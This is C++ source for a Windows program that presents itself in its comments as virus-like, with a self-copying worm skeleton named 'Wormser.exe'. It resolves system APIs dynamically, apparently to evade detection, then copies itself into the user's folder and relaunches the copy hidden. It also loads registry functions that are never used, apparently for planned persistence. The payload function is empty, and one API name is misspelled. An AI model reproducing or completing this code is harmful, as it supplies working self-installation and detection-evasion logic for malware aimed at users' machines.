#include <Windows.h>
#include <thread>
#include <sstream>
#include <iostream>
#include <time.h>
#include <fstream>

#include "Share.h"
#include "Loader.h" //Dynamic Loading of DLLs.

#include "stdafx.h"

//Set Prototypes for Functions we're loading.
void InitPayLoad();
bool exists(const std::string& name);

//Using STD Stuff
using std::string;
using std::thread;
using std::ifstream;

//CopyFileA https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-copyfile
typedef bool(__stdcall *Copy)(LPCTSTR lpExistingFileName, LPCTSTR  lpNewFileName, BOOL bFailIfExists);
//GetModuleFileNameA https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulefilenamea
typedef DWORD(__stdcall *GetModuleFile)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
//GetUserNameA https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getusernamea
typedef BOOL(__stdcall *GetUser)(LPSTR lpBuffer, LPDWORD pcbBuffer);
//PathFileExistsA https://docs.microsoft.com/en-us/windows/desktop/api/shlwapi/nf-shlwapi-pathfileexistsa
typedef BOOL(__stdcall *FileExists)(LPCSTR pczPath);
//ShellExecuteA https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea
typedef HINSTANCE(__stdcall *StartProcess)(HWND hWnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
//RegOpenKeyExA https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regopenkeyexa
typedef void(__stdcall *OpenRegKey)(HKEY hKey, LPCSTR lpSubKey, DWORD  ulOptions, REGSAM samDesired, PHKEY  phkResult);
//RegSetValueExA https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regsetvalueexa
typedef void(__stdcall *SetRegKey)(HKEY hKey, LPCSTR pValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD  cbData);
//RegCloseKey https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regclosekey
typedef void(__stdcall *CloseRegKey)(HKEY hKey);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	srand(time(NULL));
	//Load "CopyFile" From Kernel32.dll
	Loader CopyFileLoader = Loader("Kernel32.dll", "CopyFileA");
	//Load "GetModuleFileName" From Kernel32.dll
	Loader GetModuleFileNameLoader = Loader("Kernel32.dll", "GetModuleFileNameA", CopyFileLoader.GetHandleForDll());
	//Load "GetUserName" From Advapi32.dll
	Loader GetUserNameLoader = Loader("Advapi32.dll", "GetUserNameA");
	//Load "PathFileExists" From Shlwapi.dll
	Loader FileExistLoader = Loader("Shlwapi.dll", "PathFileExistsA");
	//Load "ShellExecute" From Shell32.dll
	Loader ShellExecuteLoader = Loader("Shell32.dll", "ShellExecuteA");
	//Load "RegOpenKeyEx" From Advapi32.dll
	Loader RegOpenKeyLoader = Loader("Advapi32.dll", "RegOpenKeyExA", GetUserNameLoader.GetHandleForDll());
	//Load "RegSetValueEx" From Advapi32.dll
	Loader RegSetValueLoader = Loader("Advapi32.dll", "RegSetValueExA", GetUserNameLoader.GetHandleForDll());
	//Load "RegCloseKey" From Advapi32.dll
	Loader RegCloseKeyLoader = Loader("Advapi32.dll", "GetCloseKey", GetUserNameLoader.GetHandleForDll());

	//Set and Handle For Functions
	CopyFileLoader.Load();
	GetModuleFileNameLoader.Load();
	GetUserNameLoader.Load();
	FileExistLoader.Load();
	ShellExecuteLoader.Load();
	RegOpenKeyLoader.Load();
	RegSetValueLoader.Load();
	RegCloseKeyLoader.Load();


	//Get Function Handle For Functions.
	Copy copyFile = (Copy)(CopyFileLoader.Execute());
	GetModuleFile getModuleFileName = (GetModuleFile)(GetModuleFileNameLoader.Execute());
	GetUser getUserName = (GetUser)(GetUserNameLoader.Execute());
	FileExists pathFileExist = (FileExists)(FileExistLoader.Execute());
	StartProcess shellExecute = (StartProcess)(ShellExecuteLoader.Execute());
	OpenRegKey regOpenKey = (OpenRegKey)(RegOpenKeyLoader.Execute());
	SetRegKey regSetValue = (SetRegKey)(RegSetValueLoader.Execute());
	CloseRegKey regCloseKey = (CloseRegKey)(RegCloseKeyLoader.Execute());

	//Get Current EXE Path.
	TCHAR CurrentModulePath[MAX_PATH];
	getModuleFileName(NULL, CurrentModulePath, MAX_PATH);

	//Get Current Username
	char Username[MAX_PATH + 1];
	DWORD UsernameLength = MAX_PATH + 1;
	getUserName(Username, &UsernameLength);

	//Get Copy Path
	std::stringstream installPath;
	installPath << "C:\\Users\\" << Username << "\\Wormser.exe";

	//Start Virus Like Behaviour 
	if (exists(installPath.str()))
	{
		//Clean Up Loaded Libraries (Should Help With RunTime Detection?)
		CopyFileLoader.~Loader();
		GetModuleFileNameLoader.~Loader();
		GetUserNameLoader.~Loader();
		FileExistLoader.~Loader();

		//Start PayLoad Thread To Not Hold This Up.
		thread PayLoad(InitPayLoad);
		PayLoad.join();
		return 0;
	}

	//Copy File, Launch Copied Version, Exit This Version.
	copyFile(CurrentModulePath, installPath.str().c_str(), false);
	shellExecute(NULL, "open", installPath.str().c_str(), NULL, NULL, 0);

	exit(0);
}

inline bool exists(const string& name) {

	return ifstream(name.c_str()).good();
}

void InitPayLoad()
{

}